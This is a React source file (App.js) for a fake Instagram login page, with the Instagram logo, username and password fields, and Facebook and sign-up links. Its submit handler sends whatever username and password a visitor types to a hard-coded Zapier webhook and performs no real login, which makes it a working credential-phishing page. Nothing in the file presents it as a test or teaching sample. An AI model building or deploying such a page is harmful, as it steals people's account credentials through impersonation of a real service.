// App.js
import React, { useState } from 'react';

function App() {
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const webhookUrl = 'https://hooks.zapier.com/hooks/catch/21068256/28zjy8z/';

    try {
      const params = new URLSearchParams();
      params.append('username', formData.username);
      params.append('password', formData.password);

      const response = await fetch(webhookUrl, {
        method: 'POST',
        body: params,
      });

      if (response.ok) {
        setFormData({ username: '', password: '' });
      } else {
        alert('Failed to send data.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred while sending data.');
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50">
      <div className="w-80 bg-white p-6 rounded-md shadow-md">
        <div className="flex justify-center mb-6">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
            alt="Instagram Logo"
            className="h-12"
          />
        </div>
        <form className="space-y-4" onSubmit={handleSubmit}>
          <div>
            <input
              type="text"
              name="username"
              placeholder="Username or Email"
              value={formData.username}
              onChange={handleChange}
              className="w-full px-4 py-2 border rounded-md bg-gray-50 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
          </div>
          <div>
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className="w-full px-4 py-2 border rounded-md bg-gray-50 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
          </div>
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-md text-sm font-semibold hover:bg-blue-600 transition duration-200"
          >
            Log In
          </button>
        </form>
        <div className="flex items-center justify-between my-4">
          <div className="w-1/3 border-t border-gray-300"></div>
          <span className="text-sm text-gray-500">OR</span>
          <div className="w-1/3 border-t border-gray-300"></div>
        </div>
        <div className="flex justify-center">
          <button
            className="flex items-center justify-center text-blue-500 text-sm font-semibold hover:underline"
          >
            Log in with Facebook
          </button>
        </div>
        <p className="text-xs text-gray-500 text-center mt-6">
          Don't have an account?{' '}
          <span className="text-blue-500 font-semibold cursor-pointer hover:underline">
            Sign up
          </span>
        </p>
      </div>
    </div>
  );
}

export default App;
